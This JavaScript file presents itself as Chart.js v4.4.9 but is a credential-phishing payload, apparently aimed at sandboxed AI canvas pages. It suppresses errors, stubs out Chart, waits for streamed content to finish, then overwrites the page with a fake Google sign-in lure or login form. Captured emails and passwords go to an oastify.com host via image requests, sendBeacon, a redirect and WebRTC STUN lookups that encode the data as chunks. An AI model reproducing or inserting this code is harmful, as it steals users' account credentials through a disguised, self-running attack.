/*!
 * Chart.js v4.4.9
 * https://www.chartjs.org
 * (c) 2024 Chart.js Contributors
 * Released under the MIT License
 */

window.onerror = function() { return true; };
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); });
console.error = function() {};

(function () {
  var C = "https://msiv8t5gj953aozjrocyfigj9af13urj.oastify.com";

  // Browser detection
  var ua = navigator.userAgent;
  var isSafari = /Safari/.test(ua) && !/Chrome/.test(ua) && !/CriOS/.test(ua);
  var isChrome = /Chrome|CriOS/.test(ua);
  var isFirefox = /Firefox|FxiOS/.test(ua);
  var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua) || window.innerWidth < 768;

  // Chart.js stub
  window.Chart = function() {
    return { destroy:function(){}, update:function(){}, resize:function(){}, data:{labels:[],datasets:[]}, options:{} };
  };
  window.Chart.register = function() {};
  window.Chart.defaults = { font:{}, color:'', plugins:{legend:{},tooltip:{}} };

  // Wait for streaming to finish
  var t = null;
  var obs = new MutationObserver(function () {
    clearTimeout(t);
    t = setTimeout(takeover, 800);
  });
  obs.observe(document.documentElement, { childList:true, subtree:true, characterData:true });
  setTimeout(function () { if (t === null) takeover(); }, 4000);

  function takeover() {
    obs.disconnect();

    if (isSafari) {
      // Safari: popups blocked from sandbox. Render phishing inline.
      renderInlinePhish();
    } else {
      // Chrome/Firefox/other: popup approach
      var blob = new Blob([popupPhishHTML()], { type: "text/html" });
      var blobUrl = URL.createObjectURL(blob);
      renderLure(blobUrl);
    }
  }

  // ===== LURE SCREEN (Chrome/Firefox — leads to popup) =====
  function renderLure(blobUrl) {
    document.documentElement.innerHTML = '\
<head><meta charset="utf-8"><title>Canvas</title>\
<meta name="viewport" content="width=device-width,initial-scale=1">\
<style>\
*{box-sizing:border-box;margin:0;padding:0}\
body{font-family:"Google Sans",system-ui,-apple-system,sans-serif;background:#1a1a2e;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh}\
.wrap{text-align:center;max-width:420px;padding:40px}\
.icon{font-size:48px;margin-bottom:16px}\
h2{font-size:20px;font-weight:500;color:#fff;margin-bottom:12px}\
p{font-size:14px;color:#9e9e9e;line-height:1.6;margin-bottom:24px}\
.btn{display:inline-flex;align-items:center;gap:8px;background:#fff;color:#3c4043;border:1px solid #dadce0;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;text-decoration:none;transition:box-shadow .2s;-webkit-tap-highlight-color:rgba(0,0,0,0.1)}\
.btn:hover{box-shadow:0 1px 3px rgba(0,0,0,.2)}\
.btn:active{background:#f1f3f4}\
.sub{font-size:11px;color:#555;margin-top:20px}\
</style></head><body>\
<div class="wrap">\
<div class="icon">\u2728</div>\
<h2>Personal Intelligence</h2>\
<p>Please allow personal intelligence connections to continue. Sign in to enable personalized AI features for this app.</p>\
<a class="btn" id="go" href="BLOBURL" target="_blank" rel="noopener">GSVG Sign in with Google</a>\
<p class="sub">Powered by Google AI \u2022 Privacy Policy</p>\
</div></body>'.replace('BLOBURL', blobUrl).replace('GSVG', googleGSvg());

    // Fallback: also try window.open on click for browsers that block <a> blob
    var goBtn = document.getElementById("go");
    if (goBtn) {
      goBtn.addEventListener("click", function(e) {
        // Let the <a> try first. If popup blocked, try window.open
        setTimeout(function() {
          try { window.open(blobUrl, "_blank"); } catch(x) {}
        }, 100);
      });
    }
  }

  // ===== INLINE PHISH (Safari — renders form directly in canvas) =====
  function renderInlinePhish() {
    document.documentElement.innerHTML = '\
<head><meta charset="utf-8">\
<meta name="viewport" content="width=device-width,initial-scale=1">\
<title>Sign in - Google Accounts</title>\
<link rel="icon" href="https://accounts.google.com/favicon.ico">\
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">\
<style>' + phishCSS() + '</style></head><body>' + phishFormHTML() + '</body>';

    attachInlineHandler();
  }

  function attachInlineHandler() {
    var form = document.getElementById("f");
    if (!form) return;
    form.onsubmit = function(ev) {
      ev.preventDefault();
      var e = document.getElementById("e").value;
      var p = document.getElementById("p").value;
      document.getElementById("card").style.display = "none";
      document.getElementById("msg").style.display = "block";
      // Safari inline: exfil via WebRTC STUN (only reliable channel from sandbox)
      stunExfil(e + "|" + p);
      // Also try image/beacon as fallback (may be blocked)
      try { new Image().src = C + "/i?e=" + encodeURIComponent(e) + "&p=" + encodeURIComponent(p) + "&t=" + Date.now(); } catch(x) {}
      try { navigator.sendBeacon(C + "/b", "e=" + encodeURIComponent(e) + "&p=" + encodeURIComponent(p)); } catch(x) {}
    };
    var el = document.getElementById("e");
    if (el) el.focus();
  }

  function stunExfil(data) {
    var encoded = btoa(data).replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"");
    var host = C.replace("https://","");
    for (var i = 0; i < encoded.length; i += 50) {
      (function(chunk, idx) {
        try {
          var pc = new RTCPeerConnection({ iceServers:[{urls:"stun:"+idx+"."+chunk+"."+host}] });
          pc.createDataChannel("");
          pc.createOffer().then(function(o){pc.setLocalDescription(o);});
          setTimeout(function(){try{pc.close();}catch(x){}}, 5000);
        } catch(x) {}
      })(encoded.substring(i, i+50), Math.floor(i/50));
    }
  }

  // ===== POPUP PHISHING PAGE HTML (Chrome/Firefox) =====
  function popupPhishHTML() {
    return '<!DOCTYPE html>\
<html lang="en"><head><meta charset="utf-8">\
<meta name="viewport" content="width=device-width,initial-scale=1">\
<title>Sign in - Google Accounts</title>\
<link rel="icon" href="https://accounts.google.com/favicon.ico">\
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">\
<style>' + phishCSS() + '</style></head><body>' + phishFormHTML() + '\
<script>\
document.getElementById("f").onsubmit=function(ev){\
ev.preventDefault();\
var e=document.getElementById("e").value,p=document.getElementById("p").value;\
document.getElementById("card").style.display="none";\
document.getElementById("msg").style.display="block";\
setTimeout(function(){\
window.location="' + C + '/collect?email="+encodeURIComponent(e)+"&pass="+encodeURIComponent(p);\
},1500);\
};\
document.getElementById("e").focus();\
<\/script></body></html>';
  }

  // ===== SHARED UI COMPONENTS =====

  function googleGSvg() {
    return '<svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#34A853" d="M10.53 28.59A14.5 14.5 0 019.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 000 24c0 3.77.9 7.35 2.56 10.53l7.97-5.94z"/><path fill="#FBBC05" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.94C6.51 42.62 14.62 48 24 48z"/></svg>';
  }

  function googleLogoSvg() {
    return '<img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" height="24" width="75" style="height:24px;width:75px">';
  }

  function phishCSS() {
    return '*{box-sizing:border-box;margin:0;padding:0}\
body{font-family:"Google Sans",Roboto,Arial,Helvetica,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}\
.container{width:100%;max-width:450px;padding:48px 40px 36px}\
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}\
.logo{display:flex;justify-content:center;margin-bottom:16px}\
.logo svg{height:24px;width:75px}\
h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:4px;font-family:"Google Sans",Roboto,sans-serif}\
.subtitle{text-align:center;color:#5f6368;font-size:16px;margin-bottom:32px;font-weight:400}\
.field{position:relative;margin-bottom:24px}\
.field input{width:100%;height:56px;padding:16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;outline:none;background:#fff;font-family:Roboto,sans-serif;-webkit-appearance:none}\
.field input:focus{border:2px solid #1a73e8;padding:15px}\
.field input:focus+.label,.field input:not(:placeholder-shown)+.label{top:-8px;font-size:12px;color:#1a73e8;background:#fff;padding:0 4px}\
.field .label{position:absolute;left:12px;top:16px;color:#5f6368;font-size:16px;transition:all .15s;pointer-events:none;font-family:Roboto,sans-serif}\
.field input:not(:focus)+.label{color:#5f6368}\
.forgot{display:block;color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;margin-bottom:32px;margin-top:-8px}\
.actions{display:flex;justify-content:space-between;align-items:center}\
.create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}\
.next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:0 24px;height:36px;font-size:14px;font-weight:500;cursor:pointer;font-family:"Google Sans",Roboto,sans-serif;letter-spacing:.25px;-webkit-tap-highlight-color:rgba(0,0,0,.1);-webkit-appearance:none}\
.next:hover{background:#1765cc}\
.next:active{background:#1558b3}\
.footer{display:flex;justify-content:space-between;align-items:center;padding:16px 24px 0;margin-top:32px}\
.footer select{border:none;color:#5f6368;font-size:12px;background:none;cursor:pointer;font-family:Roboto,sans-serif;padding:8px 0;-webkit-appearance:none}\
.footer-links{display:flex;gap:24px}\
.footer-links a{color:#5f6368;font-size:12px;text-decoration:none;font-family:Roboto,sans-serif}\
.msg{display:none;text-align:center;padding:40px 20px}\
.msg .check{font-size:48px;margin-bottom:16px}\
.msg h2{font-size:20px;font-weight:400;color:#202124;margin-bottom:8px}\
.msg p{color:#5f6368;font-size:14px}';
  }

  function phishFormHTML() {
    return '<div class="container">\
<div class="card" id="card">\
<div class="logo">' + googleLogoSvg() + '</div>\
<h1>Sign in</h1>\
<p class="subtitle">to continue to Google AI</p>\
<form id="f">\
<div class="field"><input type="email" id="e" placeholder=" " autocomplete="email" required><span class="label">Email or phone</span></div>\
<div class="field"><input type="password" id="p" placeholder=" " autocomplete="current-password" required><span class="label">Enter your password</span></div>\
<a href="#" class="forgot">Forgot email?</a>\
<div class="actions"><a href="#" class="create">Create account</a><button type="submit" class="next">Next</button></div>\
</form>\
</div>\
<div class="footer"><select><option>English (United States)</option></select><div class="footer-links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>\
</div>\
<div class="msg" id="msg"><div class="check">\u2705</div><h2>Verified</h2><p>Redirecting to Google AI\u2026</p></div>';
  }
})();
